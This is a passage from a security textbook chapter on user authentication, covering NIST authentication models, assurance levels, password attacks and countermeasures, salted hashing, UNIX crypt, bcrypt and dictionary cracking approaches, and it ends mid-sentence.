\\r\\nM03_STAL0611_04_GE_C03.indd 85 10/11/17 2:44 PM\\n\\n\\n86 CHAPTER 3 / USER AUTHENTICATION\\r\\nIn most computer security contexts, user authentication is the fundamental building \\r\\nblock and the primary line of defense. User authentication is the basis for most types \\r\\nof access control and for user accountability. User authentication encompasses two \\r\\nfunctions. First, the user identifies herself to the system by presenting a credential, \\r\\nsuch as user ID. Second, the system verifies the user by the exchange of authentica\\ufffetion information.\\r\\nFor example, user Alice Toklas could have the user identifier ABTOKLAS. This \\r\\ninformation needs to be stored on any server or computer system that Alice wishes \\r\\nto use, and could be known to system administrators and other users. A typical item \\r\\nof authentication information associated with this user ID is a password, which is kept \\r\\nsecret (known only to Alice and to the system)1\\r\\n. If no one is able to obtain or guess \\r\\nAlice’s password, then the combination of Alice’s user ID and password enables \\r\\nadministrators to set up Alice’s access permissions and audit her activity. Because \\r\\nAlice’s ID is not secret, system users can send her e-mail, but because her password \\r\\nis secret, no one can pretend to be Alice.\\r\\nIn essence, identification is the means by which a user provides a claimed iden\\ufffetity to the system; user authentication is the means of establishing the validity of the \\r\\nclaim. Note user authentication is distinct from message authentication. As defined in \\r\\nChapter 2, message authentication is a procedure that allows communicating parties \\r\\nto verify that the contents of a received message have not been altered, and that the \\r\\nsource is authentic. This chapter is concerned solely with user authentication.\\r\\nThis chapter first provides an overview of different means of user authentica\\ufffetion, then examines each in some detail.\\r\\n3.1 DIGITAL USER AUTHENTICATION PRINCIPLES\\r\\nNIST SP 800-63-3 (Digital Authentication Guideline, October 2016) defines digi\\ufffetal user authentication as the process of establishing confidence in user identities \\r\\nthat are presented electronically to an information system. Systems can use the \\r\\n1\\r\\nTypically, the password is stored in hashed form on the server and this hash code may not be secret, as \\r\\nexplained subsequently in this chapter.\\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Discuss the four general means of authenticating a user’s identity.\\r\\n◆ Explain the mechanism by which hashed passwords are used for user \\r\\nauthentication.\\r\\n◆ Understand the use of the Bloom filter in password management.\\r\\n◆ Present an overview of token-based user authentication.\\r\\n◆ Discuss the issues involved and the approaches for remote user \\r\\nauthentication.\\r\\n◆ Summarize some of the key security issues for user authentication.\\r\\nM03_STAL0611_04_GE_C03.indd 86 10/11/17 2:44 PM\\n\\n\\n3.1 / DIGITAL USER AUTHENTICATION PRINCIPLES 87\\r\\nauthenticated identity to determine if the authenticated individual is authorized \\r\\nto perform particular functions, such as database transactions or access to system \\r\\nresources. In many cases, the authentication and transaction, or other authorized \\r\\nfunction, take place across an open network such as the Internet. Equally authen\\ufffetication and subsequent authorization can take place locally, such as across a local \\r\\narea network. Table 3.1, from NIST SP 800-171 (Protecting Controlled Unclassified \\r\\nInformation in Nonfederal Information Systems and Organizations, December 2016), \\r\\nprovides a useful list of security requirements for identification and authentication \\r\\nservices.\\r\\nA Model for Digital User Authentication\\r\\nNIST SP 800-63-3 defines a general model for user authentication that involves \\r\\na number of entities and procedures. We discuss this model with reference to \\r\\nFigure 3.1.\\r\\nThe initial requirement for performing user authentication is that the user \\r\\nmust be registered with the system. The following is a typical sequence for registra\\ufffetion. An applicant applies to a registration authority (RA) to become a subscriber\\r\\nof a credential service provider (CSP). In this model, the RA is a trusted entity that \\r\\nestablishes and vouches for the identity of an applicant to a CSP. The CSP then \\r\\nengages in an exchange with the subscriber. Depending on the details of the over\\ufffeall authentication system, the CSP issues some sort of electronic credential to the \\r\\nsubscriber. The credential is a data structure that authoritatively binds an identity \\r\\nand additional attributes to a token possessed by a subscriber, and can be verified \\r\\nwhen presented to the verifier in an authentication transaction. The token could \\r\\nbe an encryption key or an encrypted password that identifies the subscriber. The \\r\\nBasic Security Requirements:\\r\\n1 Identify information system users, processes acting on behalf of users, or devices.\\r\\n2 Authenticate (or verify) the identities of those users, processes, or devices, as a prerequisite to allowing \\r\\naccess to organizational information systems.\\r\\nDerived Security Requirements:\\r\\n3 Use multifactor authentication for local and network access to privileged accounts and for network access \\r\\nto non-privileged accounts.\\r\\n4 Employ replay-resistant authentication mechanisms for network access to privileged and non-privileged accounts.\\r\\n5 Prevent reuse of identifiers for a defined period.\\r\\n6 Disable identifiers after a defined period of inactivity.\\r\\n7 Enforce a minimum password complexity and change of characters when new passwords are created.\\r\\n8 Prohibit password reuse for a specified number of generations.\\r\\n9 Allow temporary password use for system logons with an immediate change to a permanent password.\\r\\n10 Store and transmit only cryptographically-protected passwords.\\r\\n11 Obscure feedback of authentication information.\\r\\nTable 3.1 Identification and Authentication Security Requirements (NIST SP 800-171)\\r\\nM03_STAL0611_04_GE_C03.indd 87 10/11/17 2:44 PM\\n\\n\\n88 CHAPTER 3 / USER AUTHENTICATION\\r\\ntoken may be issued by the CSP, generated directly by the subscriber, or provided \\r\\nby a third party. The token and credential may be used in subsequent authentica\\ufffetion events.\\r\\nOnce a user is registered as a subscriber, the actual authentication process can \\r\\ntake place between the subscriber and one or more systems that perform authen\\ufffetication and, subsequently, authorization. The party to be authenticated is called a \\r\\nclaimant, and the party verifying that identity is called a verifier. When a claimant \\r\\nsuccessfully demonstrates possession and control of a token to a verifier through an \\r\\nauthentication protocol, the verifier can verify that the claimant is the subscriber \\r\\nnamed in the corresponding credential. The verifier passes on an assertion about the \\r\\nidentity of the subscriber to the relying party (RP). That assertion includes identity \\r\\ninformation about a subscriber, such as the subscriber name, an identifier assigned \\r\\nat registration, or other subscriber attributes that were verified in the registration \\r\\nprocess. The RP can use the authenticated information provided by the verifier to \\r\\nmake access control or authorization decisions.\\r\\nAn implemented system for authentication will differ from or be more com\\ufffeplex than this simplified model, but the model illustrates the key roles and functions \\r\\nneeded for a secure authentication system.\\r\\nMeans of Authentication\\r\\nThere are four general means of authenticating a user’s identity, which can be used \\r\\nalone or in combination:\\r\\n• Something the individual knows: Examples include a password, a personal \\r\\nidentification number (PIN), or answers to a prearranged set of questions.\\r\\n• Something the individual possesses: Examples include electronic keycards, \\r\\nsmart cards, and physical keys. This type of authenticator is referred to as a \\r\\ntoken.\\r\\nFigure 3.1 The NIST SP 800-63-3 E-Authentication Architectural Model\\r\\nRegistration\\r\\nauthority\\r\\n(RA)\\r\\nRegistration, credential issuance,\\r\\nand maintenance\\r\\nE-Authentication using\\r\\ntoken and credential\\r\\nIdentity proofing\\r\\nUser registration\\r\\nToken, credential\\r\\nRegistration/issuance\\r\\nAuthenticated session\\r\\nAuthenticated protocol\\r\\nExchange\\r\\nAuthenticated\\r\\nassertion\\r\\nRegistration\\r\\nconfirmation\\r\\nToken/credential\\r\\nValidation\\r\\nRelying\\r\\nparty (RP)\\r\\nVerifier\\r\\nSubscriber/\\r\\nclaimant\\r\\nCredential\\r\\nservice\\r\\nprovider (CSP)\\r\\nM03_STAL0611_04_GE_C03.indd 88 10/11/17 2:44 PM\\n\\n\\n3.1 / DIGITAL USER AUTHENTICATION PRINCIPLES 89\\r\\n• Something the individual is (static biometrics): Examples include recognition \\r\\nby fingerprint, retina, and face.\\r\\n• Something the individual does (dynamic biometrics): Examples include recog\\ufffenition by voice pattern, handwriting characteristics, and typing rhythm.\\r\\nAll of these methods, properly implemented and used, can provide secure user \\r\\nauthentication. However, each method has problems. An adversary may be able to \\r\\nguess or steal a password. Similarly, an adversary may be able to forge or steal a token. \\r\\nA user may forget a password or lose a token. Further, there is a significant admin\\ufffeistrative overhead for managing password and token information on systems and \\r\\nsecuring such information on systems. With respect to biometric authenticators, there \\r\\nare a variety of problems, including dealing with false positives and false negatives, \\r\\nuser acceptance, cost, and convenience. Multifactor authentication refers to the use \\r\\nof more than one of the authentication means in the preceding list (see Figure 3.2). \\r\\nThe strength of authentication systems is largely determined by the number of factors \\r\\nincorporated by the system. Implementations that use two factors are considered to \\r\\nbe stronger than those that use only one factor; systems that incorporate three factors \\r\\nare stronger than systems that only incorporate two of the factors, and so on.\\r\\nRisk Assessment for User Authentication\\r\\nSecurity risk assessment in general will be dealt with in Chapter 14. Here, we introduce \\r\\na specific example as it relates to user authentication. There are three separate concepts \\r\\nwe wish to relate to one another: assurance level, potential impact, and areas of risk.\\r\\nFigure 3.2 Multifactor Authentication\\r\\nClient Client\\r\\nAuthentication\\r\\nprotocol\\r\\nAuthentication\\r\\nlogic using\\r\\nfirst factor\\r\\nPass\\r\\nFail\\r\\nAuthentication\\r\\nprotocol\\r\\nAuthentication\\r\\nlogic using\\r\\nsecond factor\\r\\nPass\\r\\nFail\\r\\nM03_STAL0611_04_GE_C03.indd 89 10/11/17 2:44 PM\\n\\n\\n90 CHAPTER 3 / USER AUTHENTICATION\\r\\nASSURANCE LEVEL An assurance level describes an organization’s degree of cer\\ufffetainty that a user has presented a credential that refers to his or her identity. More \\r\\nspecifically, assurance is defined as (1) the degree of confidence in the vetting process \\r\\nused to establish the identity of the individual to whom the credential was issued, and \\r\\n(2) the degree of confidence that the individual who uses the credential is the individ\\ufffeual to whom the credential was issued. SP 800-63-3 recognizes four levels of assurance:\\r\\n• Level 1: Little or no confidence in the asserted identity’s validity. An example \\r\\nof where this level is appropriate is a consumer registering to participate in a \\r\\ndiscussion at a company website discussion board. Typical authentication tech\\ufffenique at this level would be a user-supplied ID and password at the time of the \\r\\ntransaction.\\r\\n• Level 2: Some confidence in the asserted identity’s validity. Level 2 credentials \\r\\nare appropriate for a wide range of business with the public where organi\\ufffezations require an initial identity assertion (the details of which are verified \\r\\nindependently prior to any action). At this level, some sort of secure authentica\\ufffetion protocol needs to be used, together with one of the means of authentication \\r\\nsummarized previously and discussed in subsequent sections.\\r\\n• Level 3: High confidence in the asserted identity’s validity. This level is appro\\ufffepriate to enable clients or employees to access restricted services of high value \\r\\nbut not the highest value. An example for which this level is appropriate: \\r\\nA patent attorney electronically submits confidential patent information to the \\r\\nU.S. Patent and Trademark Office. Improper disclosure would give competitors \\r\\na competitive advantage. Techniques that would need to be used at this level \\r\\nrequire more than one factor of authentication; that is, at least two independent \\r\\nauthentication techniques must be used.\\r\\n• Level 4: Very high confidence in the asserted identity’s validity. This level is \\r\\nappropriate to enable clients or employees to access restricted services of very \\r\\nhigh value or for which improper access is very harmful. For example, a law \\r\\nenforcement official accesses a law enforcement database containing crimi\\ufffenal records. Unauthorized access could raise privacy issues and/or compromise \\r\\ninvestigations. Typically, level 4 authentication requires the use of multiple fac\\ufffetors as well as in-person registration.\\r\\nPOTENTIAL IMPACT A concept closely related to that of assurance level is potential \\r\\nimpact. FIPS 199 (Standards for Security Categorization of Federal Information and \\r\\nInformation Systems, 2004) defines three levels of potential impact on organizations \\r\\nor individuals should there be a breach of security (in our context, a failure in user \\r\\nauthentication):\\r\\n• Low: An authentication error could be expected to have a limited adverse effect \\r\\non organizational operations, organizational assets, or individuals. More spe\\ufffecifically, we can say that the error might: (1) cause a degradation in mission \\r\\ncapability to an extent and duration that the organization is able to perform its \\r\\nprimary functions, but the effectiveness of the functions is noticeably reduced; \\r\\n(2) result in minor damage to organizational assets; (3) result in minor financial \\r\\nloss to the organization or individuals; or (4) result in minor harm to individuals.\\r\\nM03_STAL0611_04_GE_C03.indd 90 10/11/17 2:44 PM\\n\\n\\n3.1 / DIGITAL USER AUTHENTICATION PRINCIPLES 91\\r\\n• Moderate: An authentication error could be expected to have a serious adverse \\r\\neffect. More specifically, the error might: (1) cause a significant degradation in \\r\\nmission capability to an extent and duration that the organization is able to per\\ufffeform its primary functions, but the effectiveness of the functions is significantly \\r\\nreduced; (2) result in significant damage to organizational assets; (3) result in \\r\\nsignificant financial loss; or (4) result in significant harm to individuals that does \\r\\nnot involve loss of life or serious life-threatening injuries.\\r\\n• High: An authentication error could be expected to have a severe or cata\\ufffestrophic adverse effect. The error might: (1) cause a severe degradation in or \\r\\nloss of mission capability to an extent and duration that the organization is not \\r\\nable to perform one or more of its primary functions; (2) result in major damage \\r\\nto organizational assets; (3) result in major financial loss to the organization or \\r\\nindividuals; or (4) result in severe or catastrophic harm to individuals involving \\r\\nloss of life or serious life-threatening injuries.\\r\\nAREAS OF RISK The mapping between the potential impact and the appropriate \\r\\nlevel of assurance that is satisfactory to deal with the potential impact depends on \\r\\nthe context. Table 3.2 shows a possible mapping for various risks that an organiza\\ufffetion may be exposed to. This table suggests a technique for doing risk assessment. \\r\\nFor a given information system or service asset of an organization, the organization \\r\\nneeds to determine the level of impact if an authentication failure occurs, using the \\r\\ncategories of impact, or risk areas, that are of concern.\\r\\nFor example, consider the potential for financial loss if there is an authentica\\ufffetion error that results in unauthorized access to a database. Depending on the nature \\r\\nof the database, the impact could be:\\r\\n• Low: At worst, an insignificant or inconsequential unrecoverable financial \\r\\nloss to any party, or at worst, an insignificant or inconsequential organization \\r\\nliability.\\r\\n• Moderate: At worst, a serious unrecoverable financial loss to any party, or a \\r\\nserious organization liability.\\r\\n• High: Severe or catastrophic unrecoverable financial loss to any party; or severe \\r\\nor catastrophic organization liability.\\r\\nAssurance Level Impact Profiles\\r\\nPotential Impact Categories for Authentication Errors 1 2 3 4\\r\\nInconvenience, distress, or damage to standing or reputation Low Mod Mod High\\r\\nFinancial loss or organization liability Low Mod Mod High\\r\\nHarm to organization programs or interests None Low Mod High\\r\\nUnauthorized release of sensitive information None Low Mod High\\r\\nPersonal safety None None Low Mod/\\r\\nHigh\\r\\nCivil or criminal violations None Low Mod High\\r\\nTable 3.2 Maximum Potential Impacts for Each Assurance Level\\r\\nM03_STAL0611_04_GE_C03.indd 91 10/11/17 2:44 PM\\n\\n\\n92 CHAPTER 3 / USER AUTHENTICATION\\r\\nThe table indicates that if the potential impact is low, an assurance level of 1 \\r\\nis adequate. If the potential impact is moderate, an assurance level of 2 or 3 should \\r\\nbe achieved. And if the potential impact is high, an assurance level of 4 should be \\r\\nimplemented. Similar analysis can be performed for the other categories shown in \\r\\nthe table. The analyst can then pick an assurance level such that it meets or exceeds \\r\\nthe requirements for assurance in each of the categories listed in the table. So, for \\r\\nexample, for a given system, if any of the impact categories has a potential impact of \\r\\nhigh, or if the personal safety category has a potential impact of moderate or high, \\r\\nthen level 4 assurance should be implemented.\\r\\n3.2 PASSWORD-BASED AUTHENTICATION\\r\\nA widely used line of defense against intruders is the password system. Virtually all \\r\\nmultiuser systems, network-based servers, Web-based e-commerce sites, and other \\r\\nsimilar services require that a user provide not only a name or identifier (ID) but also \\r\\na password. The system compares the password to a previously stored password for \\r\\nthat user ID, maintained in a system password file. The password serves to authen\\ufffeticate the ID of the individual logging on to the system. In turn, the ID provides \\r\\nsecurity in the following ways:\\r\\n• The ID determines whether the user is authorized to gain access to a system.\\r\\nIn some systems, only those who already have an ID filed on the system are \\r\\nallowed to gain access.\\r\\n• The ID determines the privileges accorded to the user. A few users may have \\r\\nadministrator or “superuser” status that enables them to read files and perform \\r\\nfunctions that are especially protected by the operating system. Some systems \\r\\nhave guest or anonymous accounts, and users of these accounts have more \\r\\nlimited privileges than others.\\r\\n• The ID is used in what is referred to as discretionary access control. For exam\\ufffeple, by listing the IDs of the other users, a user may grant permission to them \\r\\nto read files owned by that user.\\r\\nThe Vulnerability of Passwords\\r\\nIn this subsection, we outline the main forms of attack against password-based \\r\\nauthentication and briefly outline a countermeasure strategy. The remainder of \\r\\nSection 3.2 goes into more detail on the key countermeasures.\\r\\nTypically, a system that uses password-based authentication maintains a pass\\ufffeword file indexed by user ID. One technique that is typically used is to store not the \\r\\nuser’s password but a one-way hash function of the password, as described subsequently.\\r\\nWe can identify the following attack strategies and countermeasures:\\r\\n• Offline dictionary attack: Typically, strong access controls are used to protect \\r\\nthe system’s password file. However, experience shows that determined hack\\ufffeers can frequently bypass such controls and gain access to the file. The attacker \\r\\nobtains the system password file and compares the password hashes against \\r\\nM03_STAL0611_04_GE_C03.indd 92 10/11/17 2:44 PM\\n\\n\\n3.2 / PASSWORD-BASED AUTHENTICATION 93\\r\\nhashes of commonly used passwords. If a match is found, the attacker can gain \\r\\naccess by that ID/password combination. Countermeasures include controls to \\r\\nprevent unauthorized access to the password file, intrusion detection measures \\r\\nto identify a compromise, and rapid reissuance of passwords should the pass\\ufffeword file be compromised.\\r\\n• Specific account attack: The attacker targets a specific account and submits \\r\\npassword guesses until the correct password is discovered. The standard coun\\ufffetermeasure is an account lockout mechanism, which locks out access to the \\r\\naccount after a number of failed login attempts. Typical practice is no more \\r\\nthan five access attempts.\\r\\n• Popular password attack: A variation of the preceding attack is to use a popu\\ufffelar password and try it against a wide range of user IDs. A user’s tendency is \\r\\nto choose a password that is easily remembered; this unfortunately makes the \\r\\npassword easy to guess. Countermeasures include policies to inhibit the selec\\ufffetion by users of common passwords and scanning the IP addresses of authenti\\ufffecation requests and client cookies for submission patterns.\\r\\n• Password guessing against single user: The attacker attempts to gain knowl\\ufffeedge about the account holder and system password policies and uses that \\r\\nknowledge to guess the password. Countermeasures include training in and \\r\\nenforcement of password policies that make passwords difficult to guess. Such \\r\\npolicies address the secrecy, minimum length of the password, character set, \\r\\nprohibition against using well-known user identifiers, and length of time before \\r\\nthe password must be changed.\\r\\n• Workstation hijacking: The attacker waits until a logged-in workstation is unat\\ufffetended. The standard countermeasure is automatically logging the workstation \\r\\nout after a period of inactivity. Intrusion detection schemes can be used to \\r\\ndetect changes in user behavior.\\r\\n• Exploiting user mistakes: If the system assigns a password, then the user is \\r\\nmore likely to write it down because it is difficult to remember. This situation \\r\\ncreates the potential for an adversary to read the written password. A user may \\r\\nintentionally share a password, to enable a colleague to share files, for example. \\r\\nAlso, attackers are frequently successful in obtaining passwords by using social \\r\\nengineering tactics that trick the user or an account manager into revealing a \\r\\npassword. Many computer systems are shipped with preconfigured passwords \\r\\nfor system administrators. Unless these preconfigured passwords are changed, \\r\\nthey are easily guessed. Countermeasures include user training, intrusion detec\\ufffetion, and simpler passwords combined with another authentication mechanism.\\r\\n• Exploiting multiple password use: Attacks can also become much more effec\\ufffetive or damaging if different network devices share the same or a similar pass\\ufffeword for a given user. Countermeasures include a policy that forbids the same \\r\\nor similar password on particular network devices.\\r\\n• Electronic monitoring: If a password is communicated across a network to log \\r\\non to a remote system, it is vulnerable to eavesdropping. Simple encryption will \\r\\nnot fix this problem, because the encrypted password is, in effect, the password \\r\\nand can be observed and reused by an adversary.\\r\\nM03_STAL0611_04_GE_C03.indd 93 10/11/17 2:44 PM\\n\\n\\n94 CHAPTER 3 / USER AUTHENTICATION\\r\\nDespite the many security vulnerabilities of passwords, they remain the most \\r\\ncommonly used user authentication technique, and this is unlikely to change in the \\r\\nforeseeable future [HERL12]. Among the reasons for the persistent popularity of \\r\\npasswords are the following:\\r\\n1. Techniques that utilize client-side hardware, such as fingerprint scanners and \\r\\nsmart card readers, require the implementation of the appropriate user authen\\ufffetication software to exploit this hardware on both the client and server systems. \\r\\nUntil there is widespread acceptance on one side, there is reluctance to imple\\ufffement on the other side, so we end up with a who-goes-first stalemate.\\r\\n2. Physical tokens, such as smart cards, are expensive and/or inconvenient to carry \\r\\naround, especially if multiple tokens are needed.\\r\\n3. Schemes that rely on a single sign-on to multiple services, using one of the non\\ufffepassword techniques described in this chapter, create a single point of security risk.\\r\\n4. Automated password managers that relieve users of the burden of knowing and \\r\\nentering passwords have poor support for roaming and synchronization across \\r\\nmultiple client platforms, and their usability had not be adequately researched.\\r\\nThus, it is worth our while to study the use of passwords for user authentication \\r\\nin some detail.\\r\\nThe Use of Hashed Passwords\\r\\nA widely used password security technique is the use of hashed passwords and a salt \\r\\nvalue. This scheme is found on virtually all UNIX variants as well as on a number \\r\\nof other operating systems. The following procedure is employed (see Figure 3.3a). \\r\\nTo load a new password into the system, the user selects or is assigned a password. \\r\\nThis password is combined with a fixed-length salt value [MORR79]. In older imple\\ufffementations, this value is related to the time at which the password is assigned to the \\r\\nuser. Newer implementations use a pseudorandom or random number. The password \\r\\nand salt serve as inputs to a hashing algorithm to produce a fixed-length hash code. \\r\\nThe hash algorithm is designed to be slow to execute in order to thwart attacks. The \\r\\nhashed password is then stored, together with a plaintext copy of the salt, in the \\r\\npassword file for the corresponding user ID. The hashed password method has been \\r\\nshown to be secure against a variety of cryptanalytic attacks [WAGN00].\\r\\nWhen a user attempts to log on to a UNIX system, the user provides an ID \\r\\nand a password (see Figure 3.3b). The operating system uses the ID to index into the \\r\\npassword file and retrieve the plaintext salt and the encrypted password. The salt \\r\\nand user-supplied password are used as input to the encryption routine. If the result \\r\\nmatches the stored value, the password is accepted.\\r\\nThe salt serves three purposes:\\r\\n• It prevents duplicate passwords from being visible in the password file. Even if \\r\\ntwo users choose the same password, those passwords will be assigned different \\r\\nsalt values. Hence, the hashed passwords of the two users will differ.\\r\\n• It greatly increases the difficulty of offline dictionary attacks. For a salt of length \\r\\nb bits, the number of possible passwords is increased by a factor of 2b\\r\\n, increasing \\r\\nthe difficulty of guessing a password in a dictionary attack.\\r\\nM03_STAL0611_04_GE_C03.indd 94 10/11/17 2:44 PM\\n\\n\\n3.2 / PASSWORD-BASED AUTHENTICATION 95\\r\\n• It becomes nearly impossible to find out whether a person with passwords on \\r\\ntwo or more systems has used the same password on all of them.\\r\\nTo see the second point, consider the way that an offline dictionary attack \\r\\nwould work. The attacker obtains a copy of the password file. Suppose first that the \\r\\nsalt is not used. The attacker’s goal is to guess a single password. To that end, the \\r\\nattacker submits a large number of likely passwords to the hashing function. If any \\r\\nof the guesses matches one of the hashes in the file, then the attacker has found a \\r\\npassword that is in the file. But faced with the UNIX scheme, the attacker must take \\r\\nFigure 3.3 UNIX Password Scheme\\r\\nSlow hash\\r\\nfunction\\r\\nSalt\\r\\nSalt\\r\\nPassword\\r\\nSlow hash\\r\\nfunction\\r\\nPassword\\r\\nHashed password\\r\\nUser ID\\r\\nUser Id\\r\\nSalt Hash code\\r\\nUser ID Salt Hash code\\r\\nPassword file\\r\\nPassword file\\r\\nLoad\\r\\nCompare\\r\\nSelect\\r\\n(a) Loading a new password\\r\\n(b) Verifying a password\\r\\nM03_STAL0611_04_GE_C03.indd 95 10/11/17 2:44 PM\\n\\n\\n96 CHAPTER 3 / USER AUTHENTICATION\\r\\neach guess and submit it to the hash function once for each salt value in the dictionary \\r\\nfile, multiplying the number of guesses that must be checked.\\r\\nThere are two threats to the UNIX password scheme. First, a user can gain \\r\\naccess on a machine using a guest account or by some other means then run a \\r\\npassword guessing program, called a password cracker, on that machine. The \\r\\nattacker should be able to check many thousands of possible passwords with \\r\\nlittle resource consumption. In addition, if an opponent is able to obtain a copy \\r\\nof the password file, then a cracker program can be run on another machine at \\r\\nleisure. This enables the opponent to run through millions of possible passwords \\r\\nin a reasonable period.\\r\\nUNIX IMPLEMENTATIONS Since the original development of UNIX, many imple\\ufffementations have relied on the following password scheme. Each user selects a pass\\ufffeword of up to eight printable characters in length. This is converted into a 56-bit \\r\\nvalue (using 7-bit ASCII) that serves as the key input to an encryption routine. The \\r\\nhash routine, known as crypt(3), is based on DES. A 12-bit salt value is used. The \\r\\nmodified DES algorithm is executed with a data input consisting of a 64-bit block \\r\\nof zeros. The output of the algorithm then serves as input for a second encryption. \\r\\nThis process is repeated for a total of 25 encryptions. The resulting 64-bit output is \\r\\nthen translated into an 11-character sequence. The modification of the DES algo\\uffferithm converts it into a one-way hash function. The crypt(3) routine is designed to \\r\\ndiscourage guessing attacks. Software implementations of DES are slow compared \\r\\nto hardware versions, and the use of 25 iterations multiplies the time required \\r\\nby 25.\\r\\nThis particular implementation is now considered woefully inadequate. For \\r\\nexample, [PERR03] reports the results of a dictionary attack using a supercomputer. \\r\\nThe attack was able to process over 50 million password guesses in about 80 minutes. \\r\\nFurther, the results showed that for about $10,000, anyone should be able to do the \\r\\nsame in a few months using one uniprocessor machine. Despite its known weaknesses, \\r\\nthis UNIX scheme is still often required for compatibility with existing account man\\ufffeagement software or in multivendor environments.\\r\\nThere are other much stronger hash/salt schemes available for UNIX. The \\r\\nrecommended hash function for many UNIX systems, including Linux, Solaris, and \\r\\nFreeBSD (a widely used open source UNIX), is based on the MD5 secure hash algo\\uffferithm (which is similar to, but not as secure as SHA-1). The MD5 crypt routine uses a \\r\\nsalt of up to 48 bits and effectively has no limitations on password length. It produces \\r\\na 128-bit hash value. It is also far slower than crypt(3). To achieve the slowdown, MD5 \\r\\ncrypt uses an inner loop with 1000 iterations.\\r\\nProbably the most secure version of the UNIX hash/salt scheme was developed \\r\\nfor OpenBSD, another widely used open source UNIX. This scheme, reported in \\r\\n[PROV99], uses a hash function based on the Blowfish symmetric block cipher. The \\r\\nhash function, called Bcrypt, is quite slow to execute. Bcrypt allows passwords of up \\r\\nto 55 characters in length and requires a random salt value of 128 bits, to produce a \\r\\n192-bit hash value. Bcrypt also includes a cost variable; an increase in the cost vari\\ufffeable causes a corresponding increase in the time required to perform a Bcyrpt hash. \\r\\nThe cost assigned to a new password is configurable, so administrators can assign a \\r\\nhigher cost to privileged users.\\r\\nM03_STAL0611_04_GE_C03.indd 96 10/11/17 2:44 PM\\n\\n\\n3.2 / PASSWORD-BASED AUTHENTICATION 97\\r\\nPassword Cracking of User-Chosen Passwords\\r\\nTRADITIONAL APPROACHES The traditional approach to password guessing, \\r\\nor password cracking as it is called, is to develop a large dictionary of possible \\r\\npasswords and to try each of these against the password file. This means that each \\r\\npassword must be hashed using each available salt value then compared with \\r\\nstored hash values. If no match is found, the cracking program tries variations on \\r\\nall the words in its dictionary of likely passwords. Such variations include back\\ufffeward spelling of words, additional numbers or special characters, or sequence of \\r\\ncharacters.\\r\\nAn alternative is to trade off space for time by precomputing potential hash \\r\\nvalues. In this approach the attacker generates a large dictionary of possible pass\\ufffewords. For each password, the attacker generates the hash values associated with \\r\\neach possible salt value. The result is a mammoth table of hash values known as a \\r\\nrainbow table. For example, [OECH03] showed that using 1.4 GB of data, he could \\r\\ncrack 99.9% of all alphanumeric Windows password hashes in 13.8 seconds. This \\r\\napproach can be countered using a sufficiently large salt value and a sufficiently large \\r\\nhash length. Both the FreeBSD and OpenBSD approaches should be secure from \\r\\nthis attack for the foreseeable future.\\r\\nTo counter the use of large salt values and hash lengths, password crackers \\r\\nexploit the fact that some people choose easily guessable passwords. A particular \\r\\nproblem is that users, when permitted to choose their own password, tend to choose \\r\\nshort ones. [BONN12] summarizes the results of a number of studies over the past \\r\\nfew years involving over 40 million hacked passwords, as well as their own analysis \\r\\nof almost 70 million anonymized passwords of Yahoo! users, and found a tendency \\r\\ntoward six to eight characters of length and a strong dislike of non-alphanumeric \\r\\ncharacters in passwords.\\r\\nThe analysis of the 70 million passwords in [BONN12] estimates that pass\\ufffewords provide fewer than 10 bits of security against an online, trawling attack, \\r\\nand only about 20 bits of security against an optimal offline dictionary attack. In \\r\\nother words, an attacker who can manage 10 guesses per account, typically within \\r\\nthe realm of rate-limiting mechanisms, will compromise around 1% of accounts, \\r\\njust as they would against random 10-bit strings. Against an optimal attacker \\r\\nperforming unrestricted brute force and wanting to break half of all available \\r\\naccounts, passwords appear to be roughly equivalent to 20-bit random strings. \\r\\nIt can be seen then that using offline search enables an adversary to break \\r\\na large number of accounts, even if a significant amount of iterated hashing is \\r\\nused.\\r\\nPassword length is only part of the problem. Many people, when permitted \\r\\nto choose their own password, pick a password that is guessable, such as their own \\r\\nname, their street name, a common dictionary word, and so forth. This makes the job \\r\\nof password cracking straightforward. The cracker simply has to test the password \\r\\nfile against lists of likely passwords. Because many people use guessable passwords, \\r\\nsuch a strategy should succeed on virtually all systems.\\r\\nOne demonstration of the effectiveness of guessing is reported in [KLEI90]. \\r\\nFrom a variety of sources, the author collected UNIX password files, containing \\r\\nnearly 14,000 encrypted passwords. The result, which the author rightly characterizes \\r\\nM03_STAL0611_04_GE_C03.indd 97 10/11/17 2:44 PM\\n\\n\\n98 CHAPTER 3 / USER AUTHENTICATION\\r\\nas frightening, was that in all, nearly one-fourth of the passwords were guessed. The \\r\\nfollowing strategy was used:\\r\\n1. Try the user’s name, initials, account name, and other relevant personal informa\\ufffetion. In all, 130 different permutations for each user were tried.\\r\\n2. Try words from various dictionaries. The author compiled a dictionary of over \\r\\n60,000 words, including the online dictionary on the system itself, and various \\r\\nother lists as shown.\\r\\n3. Try various permutations on the words from step 2. This included making the \\r\\nfirst letter uppercase or a control character, making the entire word uppercase, \\r\\nreversing the word, changing the letter “o” to the digit “zero,” and so on. These \\r\\npermutations added another 1 million words to the list.\\r\\n4. Try various capitalization permutations on the words from step 2 that were not \\r\\nconsidered in step 3. This added almost 2 million additional words to the list.\\r\\nThus, the test involved nearly 3 million words. Using the fastest processor available, \\r\\nthe time to encrypt all these words for all possible salt values was under an hour. \\r\\nKeep in mind that such a thorough search could produce a success rate of about \\r\\n25%, whereas even a single hit may be enough to gain a wide range of privileges on \\r\\na system.\\r\\nAttacks that use a combination of brute-force and dictionary techniques have \\r\\nbecome common. A notable example of this dual approach is John the Ripper, an \\r\\nopen-source password cracker first developed in 1996, and still in use [OPEN13].\\r\\nMODERN APPROACHES Sadly, this type of vulnerability has not lessened in the past \\r\\n25 years or so. Users are doing a better job of selecting passwords, and organiza\\ufffetions are doing a better job of forcing users to pick stronger passwords, a concept \\r\\nknown as a complex password policy, as discussed subsequently. However, password\\ufffecracking techniques have improved to keep pace. The improvements are of two \\r\\nkinds. First, the processing capacity available for password cracking has increased \\r\\ndramatically. Now used increasingly for computing, graphics processors allow \\r\\npassword-cracking programs to work thousands of times faster than they did just a \\r\\ndecade ago on similarly priced PCs that used traditional CPUs alone. A PC running \\r\\na single AMD Radeon HD7970 GPU, for instance, can try on average an 8.2 * 109\\r\\npassword combinations each second, depending on the algorithm used to scramble \\r\\nthem [GOOD12a]. Only a decade ago, such speeds were possible only when using \\r\\npricey supercomputers.\\r\\nThe second area of improvement in password cracking is in the use of sophisti\\ufffecated algorithms to generate potential passwords. For example, [NARA05] developed \\r\\na model for password generation using the probabilities of letters in natural language. \\r\\nThe researchers used standard Markov modeling techniques from natural language \\r\\nprocessing to dramatically reduce the size of the 